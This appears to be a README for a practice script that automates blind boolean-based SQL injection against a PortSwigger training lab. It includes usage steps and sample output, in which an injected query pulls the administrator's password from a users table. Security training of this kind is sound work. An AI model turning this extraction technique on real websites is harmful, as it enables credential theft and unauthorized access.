A multithreaded blind boolean based sqli script. 

Since the AWAE course focuses on Sqli exploitation also I thought it would be good practice to try to speed up my blind sqli exploits. 

Following script is a multithreaded blind boolean based sqli data extraction script for the portswigger conditional response [Challange](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses)


#### How to use
Just login to your portswigger web challange account go to the sqli [lab conditional responses](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses) Challange and get the lab link. Feed the URL of the web challange to the script and it will do the rest. 

```python
$python BooleanBlind_sqli.py https://acaa1fc61fefd8e080f96da3002b004c.web-security-academy.net/
[*] Got Tracking Cookie: 05jkUFvi9vfaarHY
[*] Starting main thread
--------------------
[*] Query output Length 20
699b4e06cjecmisuxirw
Query> (select password from users where username='administrator')
Result :: eb6jues9xcm94ri6c0iw
```

### NOTE:
Only the data extraction part of the script is multithreaded at the moment I dind't feel the need to multi thread the query length part. 



